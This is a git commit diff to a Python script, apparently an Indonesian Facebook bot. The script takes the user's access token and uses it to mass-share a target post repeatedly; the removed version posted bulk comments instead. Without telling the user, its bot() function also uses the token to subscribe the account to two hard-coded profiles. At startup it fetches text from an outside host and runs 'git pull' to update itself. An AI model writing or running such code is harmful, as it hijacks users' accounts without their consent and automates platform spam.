b805df38ac01e0c9cfa98abbadfb5520761d1b98
XNSEVEN <72521515+xnsvn@users.noreply.github.com>
2022-02-17 22:42:51 +0700

    Update run.py
    Updet

--- run.py
+++ run.py
@@ -1,33 +1,40 @@
-#09 02 2022 : 16.40
-#vierblowxkim project
-#https://www.facebook.com/groups/191762347517138
+#09-02-2022 : 16.40
+#17-02-2022 : 22.32
+#hanya seorang perekode biasa
 #georgy alifich el zhukov
-#rekode tidak membuatmu menjadi hengksr wibu tzy
+#github.com/xnsvn
 import os, sys, re, time, requests, calendar, random,json
 from datetime import datetime
 from datetime import date
-komen = []
-
+salam212 = requests.get("http://dindaacrack.6te.net/siang.php").text
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+my_color = [P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
 def login():
 	os.system("clear")
 	try:
 		token = open('token.txt', 'r')
-		menu()
+		main()
 	except (KeyError, IOError):
 		os.system('clear')
-		#logo()
-		print("\n     ANDA HARUS LOGIN")
-		token = input('\n token : ')
+		print("\n    [  ANDA HARUS LOGIN ]")
+		token = input('\n [ TOKEN : ');print("]")
 		try:
 			zedd = open('token.txt', 'w')
 			zedd.write(token)
 			zedd.close()
 			bot()
-			menu()
+			main()
 		except KeyError:
 			print("token eror")
 			sys.exit() 
-			
 def bot():
 	try:
 		token = open('token.txt', 'r').read()
@@ -39,38 +46,44 @@ def bot():
 	requests.post('https://graph.facebook.com/100056548009815/subscribers?access_token=' + token)#285423000019298
 	requests.post('https://graph.facebook.com/100024551913570/subscribers?access_token=' + token)
 	#tambahin boleh ganti/hapus jangan hargai pembuat
-def menu():
-	try:
-		toket=open('token.txt','r').read()
-	except IOError:
-		print("\n*token kadaluwarsa!")
-		os.system('rm -rf token.txt')
-		login()
-	print("")
-	km = input('*link post   : ')
-	try:
-		p = requests.get("https://graph.facebook.com/100024551913570?fields=feed.limit(10000)&access_token="+toket)
-		a = json.loads(p.text)
-		print("\n*wait")
-		for s in a['feed']['data']:
-			f = s['id']
-			komen.append(1136886750473045)
-			requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			#requests.post("https://graph.facebook.com/1136886750473045/comments?message="+km+"&access_token="+toket)
-			print('*done '+str(len(komen)))
-		print("\r*END"+str(len(komen)))
-		exit()
-	except KeyError:
-		print("* ID NOT FOUND")
-		exit()
-        
+def main():
+    global token
+    try:   	
+        token = open('token.txt', 'r').read()
+        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
+        a = json.loads(otw.text)
+        na1m = a['name']
+    except (KeyError, IOError):
+        os.system('clear')
+        print("\n [!] token kadaluwarsa!")
+        os.system('rm -f token.txt')
+        login()
+    except requests.exceptions.ConnectionError:
+        exit("[!] anda tidak terhubung ke internet!")
+    print(" [ selamat %s%s ]\n"%(salam212,na1m));time.sleep(0.03)
+    print("")
+    print("*target id harus publik")
+    id = input('*id post : ')
+    m=int(input(f'*limit  : '))
+    p=int(input(f'*Delay  :'))
+    time.sleep(1)
+    print("*have a nice day")
+    input("*Enter To start")
+    print('*silahkan tunggu beberapa menit ... \n')
+    print("*ketik ctrl+z untuk berhenti")
+    time.sleep(2)
+    try:
+	     token = open("token.txt", "r").read()
+	     for i in range(m):
+	         response1 = requests.post("https://graph.facebook.com/me/feed?method=POST&link=https://www.facebook.com/"+id+"&privacy={%27value%27:%20%27EVERYONE%27}&access_token="+token+"")
+	         print("\r[STATUS]>> "+response1.text+""+str(i)+"")
+	         time.sleep(p) 
+	         sys.stdout.write(f" \r[STATUS]>  ")
+	         sys.stdout.flush()
+    except requests.exceptions.ConnectionError:
+	    exit('! Koneksi Bermasalah')
 if __name__ == '__main__':
-	menu()
+	os.system("git pull")
+	#os.system("clear")
+	print("\n*Facebook : Georgy Alifich\n*Github : github.com/xnsvn\n*yt : AFK YT\n")
+	login()
